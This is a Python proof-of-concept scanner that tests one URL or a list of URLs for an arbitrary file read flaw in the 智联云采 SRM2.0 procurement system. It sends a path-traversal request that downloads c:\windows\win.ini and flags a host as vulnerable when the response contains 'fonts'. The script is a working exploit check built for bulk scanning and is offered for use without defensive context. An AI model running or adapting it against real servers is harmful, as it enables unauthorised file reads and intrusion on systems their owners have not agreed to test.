import requests, re
import urllib3
import string, random
from urllib.parse import urljoin, quote
import argparse
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#读取文件
def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls


def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string


def check(url):
    url = url.rstrip("/")
    #！！！修改拼接GET请求路径
    target = urljoin(url, "/adpweb/static/%2e%2e;/a/sys/runtimeLog/download?path=c:\\windows\win.ini")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
    }
    try:
        response = requests.get(target, headers=headers, verify=False)
        #！！！返回包的回显值
        if response.status_code == 200 and 'fonts' in response.text:
            print(f"\033发现:{url}: 存在智联云采SRM2.0-任意文件读取")
            return True
    except Exception as e:
        pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt

    if url:
        check(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")
